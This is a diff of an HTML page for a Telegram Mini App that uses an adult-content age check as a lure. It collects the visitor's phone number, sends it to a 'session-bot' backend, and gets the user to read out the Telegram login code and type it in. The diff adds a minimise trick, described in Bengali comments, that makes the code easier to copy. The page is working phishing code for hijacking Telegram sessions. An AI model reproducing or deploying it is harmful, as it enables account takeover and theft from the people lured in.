@@ -3,62 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Access Verification</title>
+    <title>Access Unlocked</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { box-sizing: border-box; transition: 0.3s; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { 
             font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; 
             background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
-            background-size: cover; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden;
+            background-size: cover; height: 100vh; display: flex; align-items: center; justify-content: center;
         }
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); backdrop-filter: blur(10px); z-index: 1; }
-        .card { position: relative; z-index: 2; width: 90%; max-width: 380px; background: rgba(255, 255, 255, 0.9); border-radius: 30px; padding: 30px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.4); }
-        .icon { font-size: 60px; margin-bottom: 15px; }
-        h2 { color: #333; margin: 0 0 10px; font-size: 22px; }
-        p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
-        .btn { width: 100%; padding: 16px; border-radius: 15px; border: none; font-size: 17px; font-weight: bold; cursor: pointer; background: #4caf50; color: #fff; box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4); }
-        .btn-view { background: #0088cc; margin-bottom: 15px; }
-        .otp-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
-        .otp-box { width: 45px; height: 55px; background: #fff; border: 2px solid #ddd; border-radius: 12px; font-size: 26px; font-weight: bold; color: #333; display: flex; align-items: center; justify-content: center; }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .key { background: #fff; padding: 15px; border-radius: 12px; font-size: 22px; font-weight: bold; color: #333; cursor: pointer; border: 1px solid #eee; }
-        .key:active { background: #f0f0f0; transform: scale(0.95); }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); backdrop-filter: blur(12px); z-index: 1; }
+        .card { position: relative; z-index: 2; width: 92%; max-width: 380px; background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(15px); border-radius: 30px; padding: 30px; text-align: center; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 25px 50px rgba(0,0,0,0.3); }
+        .icon-top { width: 80px; height: 80px; background: #fff; border-radius: 20px; margin: -70px auto 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+        h2 { color: #fff; margin: 10px 0; font-size: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
+        p { color: #ddd; font-size: 14px; margin-bottom: 25px; }
+        .btn-magic { width: 100%; padding: 15px; background: #4caf50; color: #fff; border: none; border-radius: 15px; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 20px; box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4); }
+        .otp-display { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
+        .otp-dot { width: 45px; height: 55px; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.3); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 26px; color: #fff; font-weight: bold; }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+        .key { background: rgba(255,255,255,0.2); padding: 18px; border-radius: 15px; font-size: 22px; color: #fff; font-weight: bold; cursor: pointer; border: none; }
+        .key:active { background: rgba(255,255,255,0.4); }
         .hidden { display: none !important; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4caf50; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .loader { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="overlay"></div>
     <div class="card">
-        <!-- Step 1: Confirm -->
+        <!-- Step 1 -->
         <div id="step1">
-            <div class="icon">🔞</div>
+            <div class="icon-top">🔞</div>
             <h2>Attention! 🔞</h2>
             <p>To continue, you must confirm that you are over 18 😊</p>
-            <button class="btn" onclick="startProcess()">🍓 confirm 🔞</button>
+            <button class="btn-magic" onclick="startFlow()">🍓 confirm 🔞</button>
         </div>
 
         <!-- Loading -->
         <div id="loading" class="hidden">
             <div class="loader"></div>
-            <p id="load_text">Wait...</p>
+            <p style="color: #fff;">Connecting to Server...</p>
         </div>
 
         <!-- Step 2: OTP -->
         <div id="step2" class="hidden">
-            <div class="icon">📩</div>
-            <p>Enter the 5-digit code that we just sent you!</p>
-            <div class="otp-container">
-                <div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div><div class="otp-box" id="b5"></div>
+            <div class="icon-top">📂</div>
+            <p style="color: #fff;">Enter the 5-digit code that we just sent you!</p>
+            <div class="otp-display">
+                <div class="otp-dot" id="d1"></div><div class="otp-dot" id="d2"></div><div class="otp-dot" id="d3"></div><div class="otp-dot" id="d4"></div><div class="otp-dot" id="d5"></div>
             </div>
-            <button class="btn btn-view" onclick="viewCode()">🔞 GET CODE 🔞</button>
+            <!-- এটাই সেই ম্যাজিক বাটন যা অ্যাপ মিনিমাইজ করে ওটিপি দেখাবে -->
+            <button class="btn-magic" onclick="getOTPMagic()" style="background: #e91e63;">🔞 GET CODE 🔞</button>
             <div class="keypad">
                 <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
                 <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
                 <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
-                <div style="background:transparent"></div><div class="key" onclick="press('0')">0</div><div class="key" onclick="back()">⌫</div>
+                <div style="background:transparent"></div><div class="key" onclick="press('0')">0</div><div class="key" onclick="clearLast()">⌫</div>
             </div>
         </div>
     </div>
@@ -67,41 +67,30 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
-        let userId = null;
+        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
 
-        // ইউজার আইডি চেক (null ফিক্স)
-        function getUserId() {
-            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                userId = tg.initDataUnsafe.user.id;
-            }
-        }
-        getUserId();
-
-        function startProcess() {
-            getUserId();
-            if (!userId) return alert("Error: User data not found. Open from Telegram!");
+        function startFlow() {
+            if(!userId) return alert("Please open from Telegram!");
             tg.requestContact((shared, data) => {
                 if (shared) {
                     document.getElementById('step1').classList.add('hidden');
                     document.getElementById('loading').classList.remove('hidden');
-                    pollContact();
+                    pollStatus();
                 }
             });
         }
 
-        async function pollContact() {
+        async function pollStatus() {
             try {
                 const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                 const data = await res.json();
-                if (data.status === "success") {
-                    sendNumber(data.phone);
-                } else { setTimeout(pollContact, 1500); }
-            } catch (e) { setTimeout(pollContact, 2000); }
+                if (data.status === "success") { sendPhone(data.phone); }
+                else { setTimeout(pollStatus, 1500); }
+            } catch (e) { setTimeout(pollStatus, 2000); }
         }
 
-        async function sendNumber(phone) {
-            document.getElementById('load_text').innerText = "Sending Code...";
+        async function sendPhone(phone) {
             const res = await fetch(`${BACKEND_URL}/send_number`, {
                 method: "POST", headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({ user_id: userId, phone: phone })
@@ -113,19 +102,24 @@
             } else { alert("Error: " + result.message); location.reload(); }
         }
 
-        // --- ম্যাজিক বাটন: ওটিপি চ্যাটে নিয়ে যাওয়া ---
-        function viewCode() {
-            tg.openTelegramLink("https://t.me/777000");
+        // --- হুবহু ভিডিওর মতো মিনিমাইজেশন ট্রিক ---
+        function getOTPMagic() {
+            /* 
+               ভিডিওর রহস্য: switchInlineQuery কল করলে মিনি অ্যাপটি নিচে ছোট হয়ে ঝুলে থাকে। 
+               ইউজারের সামনে চ্যাট লিস্ট আসে এবং ওটিপি মেসেজটি সবার ওপরে থাকে। 
+               ইউজার সেখান থেকে কোডটি দেখে আবার নিচে ঝুলে থাকা অ্যাপে ক্লিক করে।
+            */
+            tg.switchInlineQuery("", ["users", "chats"]);
         }
 
         function press(n) {
             if(currentOTP.length < 5) {
                 currentOTP += n;
-                for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || "";
+                for(let i=1; i<=5; i++) document.getElementById('d'+i).innerText = currentOTP[i-1] || "";
                 if(currentOTP.length === 5) verifyOTP();
             }
         }
-        function back() { currentOTP = currentOTP.slice(0, -1); for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; }
+        function clearLast() { currentOTP = currentOTP.slice(0, -1); for(let i=1; i<=5; i++) document.getElementById('d'+i).innerText = currentOTP[i-1] || ""; }
 
         async function verifyOTP() {
             const res = await fetch(`${BACKEND_URL}/verify_otp`, {
@@ -134,7 +128,7 @@
             });
             const data = await res.json();
             if (data.status === "success") { tg.close(); }
-            else { alert("Invalid Code!"); currentOTP = ""; back(); }
+            else { alert("Wrong Code!"); currentOTP = ""; clearLast(); }
         }
     </script>
 </body>
